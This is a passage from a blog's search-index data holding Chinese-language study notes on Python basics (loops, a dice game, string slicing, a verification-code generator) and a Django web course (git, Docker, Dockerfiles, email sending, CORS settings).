class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">n=3</span><br><span class=\"line\">while n&lt;=30:</span><br><span class=\"line\">\tif n%3==0 and n%5==0:</span><br><span class=\"line\">\t\tprint(&#x27;********&gt;&#x27;,n)</span><br><span class=\"line\">\tn+=1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"需求：赌场游戏\"><a href=\"#需求：赌场游戏\" class=\"headerlink\" title=\"需求：赌场游戏\"></a>需求：赌场游戏</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">username = input(&#x27;please input your name: &#x27;)</span><br><span class=\"line\">money = 0</span><br><span class=\"line\">answer = input(&#x27;Are you sure to play the game(y/n)? &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">if answer == &#x27;y&#x27;:</span><br><span class=\"line\">\t# 反复充值</span><br><span class=\"line\">\twhile money&lt;2:</span><br><span class=\"line\">\t\tn = int(input(&#x27;Insufficient balance, please recharge\\</span><br><span class=\"line\">(100 yuan equals 30 tokens, and recharge amount has to be multiples of 100): &#x27;))</span><br><span class=\"line\">\t\tif n%100==0 and n&gt;0:</span><br><span class=\"line\">\t\t\tmoney=(n//100)*30</span><br><span class=\"line\">\t\tprint(&#x27;Your current balance is &#123;&#125; tokens,\\</span><br><span class=\"line\">each game will cost you 2 tokens&#x27;.format(money))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tprint(&#x27;welcome to game, have fun!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\twhile True:</span><br><span class=\"line\">\t\t\t# 模拟骰子，产生骰子的值</span><br><span class=\"line\">\t\t\tt1 = random.randint(1,6)</span><br><span class=\"line\">\t\t\tt2 = random.randint(1,6)</span><br><span class=\"line\">\t\t\t# 两个骰子的值大于6即为大，否则为小</span><br><span class=\"line\">\t\t\tmoney-=2 # 扣除金币</span><br><span class=\"line\">\t\t\tprint(&#x27;system shuffle complete, please guess big or small!&#x27;)</span><br><span class=\"line\">\t\t\tguess = input(&#x27;please input big or small: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tif ((t1+t2&gt;6) and guess==&#x27;big&#x27;) or ((t1+t2&lt;=6) and guess==&#x27;small&#x27;):</span><br><span class=\"line\">\t\t\t\tprint(&#x27;Congratuations &#123;&#125;!\\</span><br><span class=\"line\">You earned one coin in this game!&#x27;.format(username))</span><br><span class=\"line\">\t\t\t\tmoney+=1</span><br><span class=\"line\">\t\t\telse:</span><br><span class=\"line\">\t\t\t\tprint(&#x27;Pity! You lose in this game!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tanswer = input(&#x27;Do you want to continue? It will cost you 2 tokens if yes!(y/n)&#x27;)</span><br><span class=\"line\">\t\t\tif answer!=&#x27;y&#x27; or money &lt; 2:</span><br><span class=\"line\">\t\t\t\tprint(&#x27;Exit the game, next time!&#x27;)</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\"># 注意：在python中，在for，while循环中没有变量的作用域，在其循环结构的内层或外层都可以获取变量的值</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串</span><br><span class=\"line\"></span><br><span class=\"line\"># s1 = &#x27;abc&#x27;</span><br><span class=\"line\"># s2 = &quot;abc&quot;</span><br><span class=\"line\"># s3 = &#x27;&#x27;&#x27;</span><br><span class=\"line\"># abc</span><br><span class=\"line\"># &#x27;&#x27;&#x27;</span><br><span class=\"line\"># print(id(s1),id(s2),id(s3)) # 三引号占用的内存空间与单双引号不同</span><br><span class=\"line\"># \t\t\t\t\t\t\t# (前提：三引号里面的内容不在同一行，保留一种其他格式的时候)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s1 == s2) # 比较的是内容</span><br><span class=\"line\"># print(s1 is s2) # 比较的是地址</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s2 == s3)</span><br><span class=\"line\"># print(s2 is s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s2)</span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"></span><br><span class=\"line\"># s1 = input(&#x27;input: &#x27;)</span><br><span class=\"line\"># s2 = input(&#x27;input: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s1 == s2) # True</span><br><span class=\"line\"># print(s1 is s2) # False </span><br><span class=\"line\"># 注意：普通变量/常量直接赋值相同内容用is判断是True，</span><br><span class=\"line\"># 用input输入来赋值，底层会做处理，即使输入相同内容，地址也会不同，用is判断是False.</span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串的运算符</span><br><span class=\"line\"></span><br><span class=\"line\"># s3 = s1 + s2  # 相当于拼接符</span><br><span class=\"line\"></span><br><span class=\"line\"># s4 = s1 * 5</span><br><span class=\"line\"></span><br><span class=\"line\"># print(s3)</span><br><span class=\"line\"># print(s4)</span><br><span class=\"line\"></span><br><span class=\"line\"># in 在字符串内</span><br><span class=\"line\"></span><br><span class=\"line\">name = &#x27;steven&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = &#x27;ste&#x27; in name # in的返回值是布尔类型</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># not in 没在字符串内</span><br><span class=\"line\"></span><br><span class=\"line\">result = &#x27;tv&#x27; not in name</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># % 字符串的格式化</span><br><span class=\"line\">print(&#x27;%s says: %s&#x27; % (name, &#x27;Everybody should study hard!&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"># r 保留原格式</span><br><span class=\"line\">print(r&#x27;%s says: \\&#x27;hahaha!\\&#x27; &#x27; % name) # 用r则有转义字符不进行转义</span><br><span class=\"line\">print(&#x27;%s says: \\&#x27;hahaha!\\&#x27; &#x27; % name)</span><br><span class=\"line\"></span><br><span class=\"line\"># [] [start:end] 切片</span><br><span class=\"line\">filename = &#x27;picture.png&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 位置都是从0开始，位置称作下标或索引</span><br><span class=\"line\">print(filename[5]) # 通过[]可以结合位置 获取字母  特点：只能获取一个字母</span><br><span class=\"line\"></span><br><span class=\"line\"># range(1,10) ---&gt; [1:10]</span><br><span class=\"line\"></span><br><span class=\"line\">print(filename[0:7]) # 包括前面不包括后面</span><br><span class=\"line\"></span><br><span class=\"line\">print(filename[3:7]) # 截取字符串</span><br><span class=\"line\"></span><br><span class=\"line\"># 省略</span><br><span class=\"line\">print(filename[3:]) # 省略后面表示取到结尾</span><br><span class=\"line\">print(filename[:7]) # 省略前面表示从0开始取值</span><br><span class=\"line\"></span><br><span class=\"line\"># 负数</span><br><span class=\"line\">print(filename[8:-1])</span><br><span class=\"line\">print(filename[:-2])</span><br><span class=\"line\">print(filename[-1:])</span><br><span class=\"line\">print(filename[-5:-1])</span><br><span class=\"line\">print(filename[10:0])</span><br><span class=\"line\"></span><br><span class=\"line\"># [start:end:step]</span><br><span class=\"line\">print(filename[::-1]) # 倒叙</span><br><span class=\"line\"></span><br><span class=\"line\">str1 = &#x27;abcdefg&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(str1[-1:-5:-1])</span><br><span class=\"line\">print(str1[5:0:-1]) # 取值方向需与取值方向一致</span><br><span class=\"line\">print(&#x27;----&gt;&#x27;,str1[5:0:1])</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定步长取值</span><br><span class=\"line\">print(str1[6:0:-2])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串的内建函数：声明一个字符串，默认可以调用内建函数</span><br><span class=\"line\"></span><br><span class=\"line\"># 第一部分：大小写相关</span><br><span class=\"line\"># capitalize()第一个单词首字母大写, title()每个单词首字母大写, istitle()判断是否是title格式, </span><br><span class=\"line\"># upper()所有字母大写, isupper(), lower()所有字母小写, islower()</span><br><span class=\"line\"></span><br><span class=\"line\">message = &#x27;zhaorui is a beautiful girl!&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">msg = message.capitalize()</span><br><span class=\"line\">print(msg)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"案例：生成验证码\"><a href=\"#案例：生成验证码\" class=\"headerlink\" title=\"案例：生成验证码\"></a>案例：生成验证码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">s=&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0987654321&#x27;</span><br><span class=\"line\">print(len(s))</span><br><span class=\"line\"># 四个随机数</span><br><span class=\"line\">code = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\"># IndexError: string index out of range  ex:print(s[62])</span><br><span class=\"line\"># index: 0~len(s)-1  0-61</span><br><span class=\"line\">\t</span><br><span class=\"line\">for i in range(4):\t\t</span><br><span class=\"line\">\tran = random.randint(0,len(s)-1)</span><br><span class=\"line\"></span><br><span class=\"line\">\tcode += s[ran] </span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;Verification Code:&#x27;+code)</span><br><span class=\"line\"></span><br><span class=\"line\"># 提示用户输入验证码</span><br><span class=\"line\">user_input = input(&#x27;please input your verification code: &#x27;)</span><br><span class=\"line\">if user_input.lower() == code.lower():</span><br><span class=\"line\">\tprint(&#x27;Verification code is correct!&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;Verification code is incorrect!&#x27;)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","categories":["python"],"tags":["基础"]},{"title":"python-web-project","url":"/2019/03/26/python-web-project/","content":"<h1 id=\"WEB后端服务第21天-项目第一天\"><a href=\"#WEB后端服务第21天-项目第一天\" class=\"headerlink\" title=\"WEB后端服务第21天-项目第一天\"></a>WEB后端服务第21天-项目第一天</h1><h2 id=\"一、搭建项目团队开发平台\"><a href=\"#一、搭建项目团队开发平台\" class=\"headerlink\" title=\"一、搭建项目团队开发平台\"></a>一、搭建项目团队开发平台</h2><p>git强制覆盖文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git push -u --force origin master</span><br></pre></td></tr></table></figure>\n\n<p>git新建分支</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git remote remove origin</span><br><span class=\"line\">git remote add origin git@github.com:orggittest/OneGouAPI.git</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;...&quot;</span><br><span class=\"line\">git checkout -b test_city  # 新建分支</span><br><span class=\"line\">git push -u origin test_city</span><br></pre></td></tr></table></figure>\n\n<p>git克隆特定分支</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone -b test_city https://github.com/XA1903LastTeam/OneGouAPI.git</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、Docker的基本用法与快速部署项目\"><a href=\"#二、Docker的基本用法与快速部署项目\" class=\"headerlink\" title=\"二、Docker的基本用法与快速部署项目\"></a>二、Docker的基本用法与快速部署项目</h2><p>主流的开发模式：DevOps开发即运维</p>\n<p>Docker是基于容器技术（虚拟技术），包含Docker仓库、镜像、容器。docker.io安装完成以后，默认存在两个进程，即Client和Server(守护进程 daemon)。一个镜像可以运行多次，每一次都会产生容器子进程。</p>\n<p>docker安装参考：<a href=\"https://www.runoob.com/docker/debian-docker-install.html\">https://www.runoob.com/docker/debian-docker-install.html</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install docker.io</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-常用命令\"><a href=\"#2-1-常用命令\" class=\"headerlink\" title=\"2.1 常用命令\"></a>2.1 常用命令</h3><ul>\n<li>docker version</li>\n<li>docker search 镜像名</li>\n<li>docker pull 镜像全名</li>\n<li>docker images 查看所有本地镜像</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># docker images </span><br><span class=\"line\">REPOSITORY                 TAG       IMAGE ID       CREATED       SIZE</span><br><span class=\"line\">redis                      latest    417b52ccc966   2 weeks ago   111MB</span><br><span class=\"line\">rustdesk/rustdesk-server   latest    474877505289   5 weeks ago   101MB</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>docker run 启动镜像</li>\n</ul>\n<p>​    同步运行镜像</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --name redis1 redis</span><br></pre></td></tr></table></figure>\n\n<p>​    ctrl+c退出</p>\n<ul>\n<li>查看docker容器进程</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker ps -l</span><br><span class=\"line\">docker ps -a</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@5000890509hax:~# docker ps -a</span><br><span class=\"line\">CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS                      PORTS                    NAMES</span><br><span class=\"line\">02a19f608650        redis               &quot;docker-entrypoint.s…&quot;   About a minute ago   Up About a minute           0.0.0.0:6377-&gt;6379/tcp   redis2</span><br><span class=\"line\">4e900edf5614        redis               &quot;docker-entrypoint.s…&quot;   13 minutes ago       Exited (0) 12 minutes ago                            redis1</span><br><span class=\"line\">7130868f61b7        redis               &quot;docker-entrypoint.s…&quot;   18 minutes ago       Exited (0) 12 minutes ago                            beautiful_napier</span><br></pre></td></tr></table></figure>\n\n<p>后台运行，且映射端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -dit --name redis2 -p 6377:6379 redis</span><br><span class=\"line\">02a19f608650b3168b9284a495af5127fc429065268ca1e942a12f3a60b80c4f</span><br></pre></td></tr></table></figure>\n\n<p>删除容器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker rm redis1</span><br></pre></td></tr></table></figure>\n\n<p>停止容器进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker stop redis1</span><br></pre></td></tr></table></figure>\n\n<p>启动容器进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker start redis1</span><br></pre></td></tr></table></figure>\n\n<p>删除镜像</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker rmi 镜像名或IMAGE_ID</span><br></pre></td></tr></table></figure>\n\n<p>Python测试连接的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> redis <span class=\"keyword\">import</span> Redis</span><br><span class=\"line\"><span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> argv</span><br><span class=\"line\"></span><br><span class=\"line\">config = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;host&#x27;</span>: <span class=\"string\">&#x27;2a01:4f9:6a:49e7:1019:8544:fcdc:1&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;port&#x27;</span>: argv[<span class=\"number\">1</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;db&#x27;</span>: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">client = Redis(**config)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Redis连接成功！%s&#x27;</span> % <span class=\"built_in\">str</span>(config))</span><br></pre></td></tr></table></figure>\n\n<p>以上内容是test_conn.py文件的，运行脚本：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python test_conn.py 6377</span><br></pre></td></tr></table></figure>\n\n<p>练习任务：</p>\n<p>docker部署mysql，并写一个mysql的测试程序。</p>\n<p>注：运行镜像是通过-e参数指定root的口令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -itd -p 3306:3306 --name master -e MYSQL_ROOT_PASSWORD=root mysql</span><br><span class=\"line\">docker run --privileged  # privileged参数可以解决iptables error</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ERROR: problem running iptables: iptables v1.6.1: can<span class=\"string\">&#x27;t initialize iptables table `filter&#x27;</span>: Permission denied (you must be root) Perhaps iptables or your kernel needs to be upgraded.</span></span><br><span class=\"line\">iptables -I INPUT -p tcp --dport 8000 -j ACCEPT # 开放端口</span><br><span class=\"line\">iptables -L -n</span><br></pre></td></tr></table></figure>\n\n<p>进入容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec redis1 ls</span><br></pre></td></tr></table></figure>\n\n<p>以上只执行redis1容器的命令，查看当前容器的工作目录下的文件，可以使用-it进入容器内部。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec -it redis1 /bin/sh</span><br></pre></td></tr></table></figure>\n\n<p>使用root用户的方式进入docker</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec -it --user root &lt;container id&gt; /bin/bash</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-Dockerfile的用法\"><a href=\"#2-3-Dockerfile的用法\" class=\"headerlink\" title=\"2.3 Dockerfile的用法\"></a>2.3 Dockerfile的用法</h3><figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ubuntu-dev:latest</span><br><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> disen <span class=\"number\">2272096201</span>@qq.com</span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr/src</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt install cron</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> git <span class=\"built_in\">clone</span> https://github.com/dabaicai233/v2ex.git</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> pip3 install scrapy</span></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr/src/v2ex/v2ex</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">chmod</span> +x start_spider.sh</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> crontab crontab.cron</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> python3</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> tgridcloudewsp/ubuntui386xenialme:latest</span><br><span class=\"line\"><span class=\"keyword\">USER</span> root <span class=\"comment\"># 指定root用户</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt-get update &amp;&amp; apt-get install -y git</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt-get install -y python3-pip</span></span><br><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> Private <span class=\"number\">1174185292</span>@qq.com</span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr/src</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt install cron -y</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> git <span class=\"built_in\">clone</span> https://github.com/orggittest/OneGuyAPI.git  <span class=\"comment\"># github仓库设置public</span></span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> pip3 install -r requirements.txt</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">chmod</span> +x auto_down.sh</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> crontab auto_down.cron</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> python3 manage.py runserver localhost:80</span></span><br></pre></td></tr></table></figure>\n\n<p>生成镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker build -t onebuy:1.0 .</span><br></pre></td></tr></table></figure>\n\n<p>导入导出镜像</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker save -o ~/project.tar project</span><br><span class=\"line\">docker load --input ~tag.tar</span><br><span class=\"line\">docker load &lt; ~/tag.tar</span><br><span class=\"line\">docker tag &lt;IMAGE ID&gt; onebuy:latest</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB后端服务第22天-Django项目第2天\"><a href=\"#WEB后端服务第22天-Django项目第2天\" class=\"headerlink\" title=\"WEB后端服务第22天-Django项目第2天\"></a>WEB后端服务第22天-Django项目第2天</h1><p><a href=\"http://m.yiguo.com/\">http://m.yiguo.com</a></p>\n<h2 id=\"一、项目页面与数据分析\"><a href=\"#一、项目页面与数据分析\" class=\"headerlink\" title=\"一、项目页面与数据分析\"></a>一、项目页面与数据分析</h2><h2 id=\"二、分类与商品模型\"><a href=\"#二、分类与商品模型\" class=\"headerlink\" title=\"二、分类与商品模型\"></a>二、分类与商品模型</h2><h2 id=\"三、广告、推荐等首页模型\"><a href=\"#三、广告、推荐等首页模型\" class=\"headerlink\" title=\"三、广告、推荐等首页模型\"></a>三、广告、推荐等首页模型</h2><h2 id=\"四、用户相关的模型\"><a href=\"#四、用户相关的模型\" class=\"headerlink\" title=\"四、用户相关的模型\"></a>四、用户相关的模型</h2><h2 id=\"五、缓存相关\"><a href=\"#五、缓存相关\" class=\"headerlink\" title=\"五、缓存相关\"></a>五、缓存相关</h2><h2 id=\"六、订单相关\"><a href=\"#六、订单相关\" class=\"headerlink\" title=\"六、订单相关\"></a>六、订单相关</h2><h1 id=\"WEB后端服务第23天-Django项目第3天\"><a href=\"#WEB后端服务第23天-Django项目第3天\" class=\"headerlink\" title=\"WEB后端服务第23天-Django项目第3天\"></a>WEB后端服务第23天-Django项目第3天</h1><h2 id=\"一、form表单类\"><a href=\"#一、form表单类\" class=\"headerlink\" title=\"一、form表单类\"></a>一、form表单类</h2><h2 id=\"二、自定义小部件widget\"><a href=\"#二、自定义小部件widget\" class=\"headerlink\" title=\"二、自定义小部件widget\"></a>二、自定义小部件widget</h2><h2 id=\"三、django中邮件发送\"><a href=\"#三、django中邮件发送\" class=\"headerlink\" title=\"三、django中邮件发送\"></a>三、django中邮件发送</h2><h3 id=\"3-1-选择邮箱\"><a href=\"#3-1-选择邮箱\" class=\"headerlink\" title=\"3.1 选择邮箱\"></a>3.1 选择邮箱</h3><p>在此配置了163邮箱，从设置页面中获取到smtp的服务器相关信息</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">EMAIL_HOST = <span class=\"string\">&#x27;smtp.163.com&#x27;</span></span><br><span class=\"line\">EMAIL_PORT = <span class=\"number\">25</span></span><br><span class=\"line\">EMAIL_HOST_USER = <span class=\"string\">&#x27;z1174....@163.com&#x27;</span></span><br><span class=\"line\">EMAIL_HOST_PASSWORD = <span class=\"string\">&#x27;******&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>EMAIL_HOST_PASSWORD使用了授权码。</p>\n<h3 id=\"3-2-django-core-mail-send-mail\"><a href=\"#3-2-django-core-mail-send-mail\" class=\"headerlink\" title=\"3.2 django.core.mail.send_mail()\"></a>3.2 django.core.mail.send_mail()</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.core.mail <span class=\"keyword\">import</span> send_mail <span class=\"keyword\">as</span> send_163_email,  get_connection</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">send_mail</span>(<span class=\"params\">request, email</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;send_mail&#x27;</span>, email)</span><br><span class=\"line\"></span><br><span class=\"line\">    subtitle = <span class=\"string\">&#x27;用户激活通知&#x27;</span></span><br><span class=\"line\">    message = <span class=\"string\">&#x27;&lt;html&gt;注册用户，&lt;a href=&quot;/&quot;&gt;请先激活&lt;/a&gt;&lt;/html&gt;&#x27;</span></span><br><span class=\"line\">    send_163_email(subtitle, <span class=\"string\">&#x27;&#x27;</span>, html_message=message, from_email=<span class=\"string\">&#x27;z1174185292w@163.com&#x27;</span>, recipient_list=[email])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> JsonResponse(&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;msg&#x27;</span>: <span class=\"string\">&#x27;发送成功&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;info&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;email&#x27;</span>: email,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-3-Python原生\"><a href=\"#3-3-Python原生\" class=\"headerlink\" title=\"3.3 Python原生\"></a>3.3 Python原生</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> smtplib</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.mime.text <span class=\"keyword\">import</span> MIMEText</span><br><span class=\"line\"><span class=\"keyword\">from</span> email.header <span class=\"keyword\">import</span> Header</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB服务后端第24天-Django项目第4天\"><a href=\"#WEB服务后端第24天-Django项目第4天\" class=\"headerlink\" title=\"WEB服务后端第24天-Django项目第4天\"></a>WEB服务后端第24天-Django项目第4天</h1><h2 id=\"一、django的接口跨域请求\"><a href=\"#一、django的接口跨域请求\" class=\"headerlink\" title=\"一、django的接口跨域请求\"></a>一、django的接口跨域请求</h2><p>请求URL中的同源：协议、域名和端口，任何一种不同都是跨域请求。</p>\n<h3 id=\"1-1-安装库\"><a href=\"#1-1-安装库\" class=\"headerlink\" title=\"1.1 安装库\"></a>1.1 安装库</h3><p>使用CORS解决跨域请求问题，django原始方式，在创建响应对象后，增加cors相关的响应头，如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">response[<span class=\"string\">&quot;Access-Control-Allow-Origin&quot;</span>] = <span class=\"string\">&quot;*&quot;</span></span><br><span class=\"line\">response[<span class=\"string\">&quot;Access-Control-Allow-Methods&quot;</span>] = <span class=\"string\">&quot;POST, GET, OPTIONS&quot;</span></span><br><span class=\"line\">response[<span class=\"string\">&quot;Access-Control-Max-Age&quot;</span>] = <span class=\"string\">&quot;1000&quot;</span></span><br><span class=\"line\">response[<span class=\"string\">&quot;Access-Control-Allow-Headers&quot;</span>] = <span class=\"string\">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果跨域请求的接口较多，也可以使用第三方插件django-cors-headers来快速配置，类似于flask-cors。pip安装命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install django-cors-headers</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-2-配置\"><a href=\"#1-2-配置\" class=\"headerlink\" title=\"1.2 配置\"></a>1.2 配置</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = [</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"string\">&#x27;corsheaders&#x27;</span>,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">MIDDLEWARE = [</span><br><span class=\"line\">\t...</span><br><span class=\"line\">    <span class=\"string\">&#x27;corsheaders.middleware.CorsMiddleware&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,</span><br><span class=\"line\">    ...</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Cors设置-白名单</span></span><br><span class=\"line\">CORS_ORIGIN_WHITELIST = (</span><br><span class=\"line\">\t<span class=\"string\">&#x27;http://localhost:9000&#x27;</span>,  <span class=\"comment\"># 允许跨域请求的协议、域名和端口</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># CORS_ORIGIN_ALLOW_ALL = True  # 允许所有的源，与白名单相同。</span></span><br><span class=\"line\">CORS_ALLOW_CREDENTIALS = <span class=\"literal\">True</span>  <span class=\"comment\"># 启动cookie</span></span><br></pre></td></tr></table></figure>\n\n<p>更多详细配置</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 跨域允许的请求方式（可选）</span></span><br><span class=\"line\">CORS_ALLOW_METHODS = (</span><br><span class=\"line\">\t<span class=\"string\">&#x27;DELETE&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;GET&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;OPTIONS&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;PATCH&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">    <span 